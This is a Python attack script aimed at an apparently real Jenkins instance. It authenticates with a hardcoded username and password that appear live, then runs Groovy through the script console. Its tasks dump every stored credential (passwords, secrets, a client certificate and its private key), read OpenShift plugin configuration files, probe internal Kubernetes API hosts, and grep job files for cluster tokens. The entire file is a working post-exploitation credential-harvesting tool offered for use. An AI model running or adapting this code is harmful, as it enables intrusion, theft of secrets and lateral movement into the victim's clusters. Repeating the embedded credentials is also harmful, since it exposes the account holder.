import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK_E = r'''def r = ["bash","-c","""
for f in /var/jenkins_home/com.openshift.jenkins.plugins.OpenShift.xml /var/jenkins_home/io.fabric8.jenkins.openshiftsync.GlobalPluginConfiguration.xml /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftImageStreams.xml /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftCreator.xml; do
  echo "===== \$f ====="
  cat \$f 2>/dev/null
  echo ''
done
echo '===== other openshift top-level configs ====='
ls -la /var/jenkins_home/ | grep -iE 'openshift|fabric8|kube'
"""].execute().text
println r
'''

TASK_F = r'''def r = ["bash","-c","""
echo '--- DNS ---'
getent hosts console.dev.amxnova.net; echo "exit=\$?"
getent hosts console.dev.amxnova.com; echo "exit=\$?"
getent hosts api-admin.dev.claroshop.com; echo "exit=\$?"
echo '--- CURL amxnova.net:8443 ---'
curl -k --max-time 8 https://console.dev.amxnova.net:8443/healthz -o /dev/null -w 'HTTP=%{http_code} time=%{time_total}\n' 2>&1; echo "exit=\$?"
echo '--- CURL amxnova.com (443) ---'
curl -k --max-time 8 https://console.dev.amxnova.com/healthz -o /dev/null -w 'HTTP=%{http_code} time=%{time_total}\n' 2>&1; echo "exit=\$?"
curl -k --max-time 8 https://console.dev.amxnova.com/api/v1/namespaces 2>&1 | head -c 800
echo ''
echo '--- CURL api-admin.dev.claroshop.com ---'
curl -k --max-time 8 https://api-admin.dev.claroshop.com/healthz -o /dev/null -w 'HTTP=%{http_code} time=%{time_total}\n' 2>&1; echo "exit=\$?"
curl -k --max-time 8 https://api-admin.dev.claroshop.com/api/v1/namespaces 2>&1 | head -c 800
"""].execute().text
println r
'''

TASK_G = r'''import com.cloudbees.plugins.credentials.*
import com.cloudbees.hudson.plugins.folder.Folder

println '===== FOLDER-SCOPED CREDENTIALS ====='
Jenkins.instance.getAllItems(Folder.class).each { f ->
    def fc = CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials.class, f, null, null)
    fc.each { c ->
        println "FOLDER[${f.fullName}] ID: ${c.id} | ${c.class.simpleName} | ${c.description}"
        try { println "  User: ${c.username}" } catch(e) {}
        try { println "  Pass: ${c.password}" } catch(e) {}
        try { println "  Secret: ${c.secret}" } catch(e) {}
    }
}
println '===== SYSTEM STORE DOMAINS ====='
def store = com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getStore()
store.getDomains().each { d ->
    println "DOMAIN: ${d.name}"
    store.getCredentials(d).each { c -> println "  ${c.id} | ${c.class.simpleName}" }
}
println '===== AMX Docker API CA client (PEM) ====='
def dc = CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials.class, Jenkins.instance, null, null).find { it.id == 'AMX Docker API CA client' }
if (dc != null) {
    try { println "clientCertificate:\n${dc.clientCertificate}" } catch(e) { println "cert err: ${e.message}" }
    try { println "clientKey:\n${dc.clientKey}" } catch(e) { println "key err: ${e.message}" }
}
'''

TASK_H = r'''def r = ["bash","-c","""
echo '===== credentialsId refs in openshift-sync jobs ====='
timeout 20 grep -rhE 'credentialsId|secretName|token' /var/jenkins_home/jobs/cs_legacy_front --include='config.xml' 2>/dev/null | sort -u | head -30
echo '===== openshift-deployer / openshift-client usage in ALL job configs ====='
timeout 25 grep -rlE 'openshift-deployer|OpenShiftDeployer|openshift-client|OpenShiftClient|withCluster|openshift\\.' /var/jenkins_home/jobs --include='config.xml' 2>/dev/null | head -15
echo '===== pipelines (Jenkinsfile) in workspace with openshift ====='
timeout 20 grep -rlE 'openshift|withCluster|oc ' /var/jenkins_home/workspace --include='Jenkinsfile*' 2>/dev/null | head -10
echo '===== build.xml / flow with token strings ====='
timeout 20 grep -rhoE 'sha256~[A-Za-z0-9_-]{20,}' /var/jenkins_home/jobs 2>/dev/null | sort -u | head -10
"""].execute().text
println r
'''

TASKS = [
    ("TASK E: OpenShift plugin global config XMLs", TASK_E),
    ("TASK F: OCP/K8s API connectivity (both amxnova TLDs + api-admin)", TASK_F),
    ("TASK G: Folder-scoped creds + system domains + AMX Docker PEM", TASK_G),
    ("TASK H: credentialsId/token refs in job configs + Jenkinsfiles", TASK_H),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
